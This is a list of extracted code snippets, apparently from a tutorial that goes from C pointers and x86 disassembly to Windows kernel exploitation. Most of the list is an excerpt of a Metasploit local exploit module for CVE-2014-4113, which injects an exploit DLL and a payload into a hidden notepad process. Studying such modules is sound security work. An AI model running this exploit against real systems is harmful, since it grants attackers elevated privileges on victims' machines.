["```\n#include <stdio.h>\n```", "```\nint main(int argc, char **argv)\n```", "```\n{\n```", "```\n    int x = 10;\n```", "```\n    int *point = &x;\n```", "```\n    int deref = *point;\n```", "```\n    printf(\"\\nVariable x is currently %d. *point is %d.\\n\\n\", x, deref);\n```", "```\n    *point = 20;\n```", "```\n    int dereftwo = *point;\n```", "```\n    printf(\"After assigning 20 to the address referenced by point, *point is now %d.\\n\\n\", dereftwo);\n```", "```\n    printf(\"x is now %d.\\n\\n\", x);\n```", "```\n}\n```", "```\nmov    DWORD PTR [rbp-20], 10\n```", "```\nlea    rax, [rbp-20]\n```", "```\nmov    QWORD PTR [rbp-8], rax\n```", "```\nmov    rax, QWORD PTR [rbp-8]\n```", "```\nmov    eax, DWORD PTR [rax]\n```", "```\nmov    DWORD PTR [rbp-12], eax\n```", "```\ncmp    ebx, 0FFFFFFFFh\n```", "```\njnz    short loc_BF9392EB\n```", "```\npush    0\n```", "```\npush    [ebp+arg_8]\n```", "```\npush    1Edh\n```", "```\npush    ebx\n```", "```\ncall    sub_BF8B959D\n```", "```\nrequire 'msf/core/post/windows/reflective_dll_injection'\n```", "```\nclass MetasploitModule < Msf::Exploit::Local\n```", "```\n    Rank = NormalRanking\n```", "```\n    include Msf::Post::File\n```", "```\n    include Msf::Post::Windows::Priv\n```", "```\n    include Msf::Post::Windows::Process\n```", "```\n    include Msf::Post::Windows::FileInfo\n```", "```\n    include Msf::Post::Windows::ReflectiveDLLInjection\n```", "```\ndef exploit\n```", "```\n    print_status('Launching notepad to host the exploit...')\n```", "```\n    notepad_process = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true})\n```", "```\n    begin\n```", "```\n        process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)\n```", "```\n        print_good(\"Process #{process.pid} launched.\")\n```", "```\n  rescue Rex::Post::Meterpreter::RequestError\n```", "```\n        print_error('Operation failed. Trying to elevate the current process...')\n```", "```\n        process = client.sys.process.open\n```", "```\n    end\n```", "```\n    print_status(\"Reflectively injecting the exploit DLL into #{process.pid}...\")\n```", "```\n   if target.arch.first == ARCH_X86\n```", "```\n        dll_file_name = 'cve-2014-4113.x86.dll'\n```", "```\n    else\n```", "```\n        dll_file_name = 'cve-2014-4113.x64.dll'\n```", "```\n    end\n```", "```\n    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-4113', dll_file_name)\n```", "```\n    library_path = ::File.expand_path(library_path)\n```", "```\n    print_status(\"Injecting exploit into #{process.pid}...\")\n```", "```\n    exploit_mem, offset = inject_dll_into_process(process, library_path)\n```", "```\n    print_status(\"Exploit injected. Injecting payload into #{process.pid}...\")\n```", "```\n    payload_mem = inject_into_process(process, payload.encoded)\n```", "```\n    print_status('Payload injected. Executing exploit...')\n```", "```\n    process.thread.create(exploit_mem + offset, payload_mem)\n```", "```\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n```", "```\nend\n```"]